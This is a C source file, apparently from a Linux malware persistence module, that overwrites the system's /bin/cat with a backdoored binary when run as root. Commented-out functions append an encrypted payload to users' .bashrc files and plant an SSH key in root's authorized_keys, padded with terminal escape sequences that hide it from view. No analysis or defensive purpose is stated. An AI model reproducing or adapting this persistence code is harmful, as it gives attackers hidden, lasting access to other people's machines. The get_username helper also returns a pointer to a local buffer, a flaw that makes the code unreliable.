#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include "persist.h"
#include "injector.c"

#define MAGIC_SEQ "\x23\x1b\x5b\x31\x41\x1b\x5b\x32\x4b\n"

// void decrypt(char *data, int len) {
//     for (unsigned long i = 0; i < len; i++) 
//         data[i] = (data[i] ^ (((((i << 4) && + 97436)) ^ 0x69) & 0xff));
// }

char *get_username(int uid) {

    char path[256];
    sprintf(path, "/etc/passwd");
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return NULL;
    }
    char line[260];
    while (fgets(line, 0x100, fp)) {
        sprintf(path, ":%d:", uid);
        if (strstr(line, path)) {

            for (int i = 0; i < 256; i++) {
                if (line[i] == ':') {
                    line[i] = '\0';
                    break;
                }
            }
            fclose(fp);
            return line;
        }
    }

    fclose(fp);
    return NULL;
}



// void bashrc(int uid) {
//     decrypt_binary(bashrc_data, bashrc_data_len);
//     FILE *fp;
//     if (uid == 0) {
//         fp = fopen("/root/.bashrc", "r");
//         if (fp != NULL) {
//             // check if already installed
//             char *line = malloc(0x100);
//             while (fgets(line, 0x100, fp)) {
//                 if (strstr(line, "when we get done, they gon play this back")) {
//                     fclose(fp);
//                     return;
//                 }
//             }
//             fclose(fp);
//         }

//         fp = fopen("/root/.bashrc", "a");
//         if (fp != NULL) {
//             fwrite(bashrc_data, 1, bashrc_data_len, fp);
//             fclose(fp);
//         }
//     } else {
//         char username[256];
//         sprintf(username, "/home/%s/.bashrc", get_username(uid));
//         fp = fopen(username, "r");
//         if (fp != NULL) {
//             // check if already installed
//             char *line = malloc(0x100);
//             while (fgets(line, 0x100, fp)) {
//                 if (strstr(line, "when we get done, they gon play this back")) {
//                     fclose(fp);
//                     return;
//                 }
//             }
//             fclose(fp);
//         }

//         fp = fopen(username, "a");
//         if (fp != NULL) {
//             fwrite(bashrc_data, 1, bashrc_data_len, fp);
//             fclose(fp);
//         }
//     }
// }


// void ssh_key(int uid, char *key) { // doesnt work
//     if (uid == 0) {
//         FILE *fp = fopen("/root/.ssh/authorized_keys", "a");
//         if (fp != NULL) {
//             fprintf(fp, "%s\n", key);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp);
//             fclose(fp);
//         }
//     } else {
//         // get username
//         char username[256];
//         // sprintf(username, "/home/%s/.ssh/authorized_keys", get_username(uid));
//         sprintf(username, "/tmp/%s", get_username(uid));

//         FILE *fp1 = fopen(username, "a");
//         if (fp1 != NULL) {
//             fprintf(fp1, "%s\n", key);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp1);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp1);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp1);
//             fwrite(MAGIC_SEQ, 1, sizeof(MAGIC_SEQ), fp1);
//             fclose(fp1);
//         }
//     }
// }

void cat_backdoor(int uid) {
    // check if cat binary contains libp
    if (uid != 0) {
        return;
    }
    FILE* fp = fopen("/bin/cat", "rb");
    if (fp == NULL) {
        return;
    }
    char *data = malloc(0x100);
    while (fread(data, 0x100, 1, fp)) {
        for (int i = 0; i < 0x100 - 4; i++) {
            if (data[i] == 'l' && data[i + 1] == 'i' && data[i + 2] == 'b' && data[i + 3] == 'p') {
                // log_info("cat already backdoored\n");
                fclose(fp);
                return;
            }
        }
    }
    fclose(fp);
    char *binary = get_binary("cat");
    // log_info("backdooring cat\n");
    fp = fopen("/bin/cat", "wb");
    if (fp == NULL) {
        // log_info("failed to open cat\n");
        return;
    }
    fwrite(binary + 8, (unsigned char)binary[0] | ((unsigned char)binary[1] << 8), 1, fp);
    // log_info("wrote %d bytes to cat\n", (unsigned char)binary[0] | ((unsigned char)binary[1] << 8));
    fclose(fp);
    chmod("/bin/cat", 0755);
    munmap(binary, 0x10000);
    return;
}
